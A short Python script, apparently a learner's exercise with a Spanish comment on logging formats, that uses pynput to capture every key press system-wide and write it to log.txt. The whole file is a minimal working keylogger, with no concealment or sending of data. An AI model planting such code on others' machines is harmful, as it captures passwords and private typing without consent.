from pynput.keyboard import Key, Listener
import logging


# Format lo que hace es darle un formato, es decir ponerle una esctructura para que se lea de una forma u otra por ejemplo con: format="%(asctime)s - %(message)s")) el (%) marca que viene una variable y la (s) que lo convierta a string: en uno muestra el tiempo y el otro el mensaje


logging.basicConfig(filename="log.txt", level=logging.DEBUG)

def presionar(key):
    logging.info(str(key))

with Listener(on_press=presionar) as listener:
    listener.join()
    

    


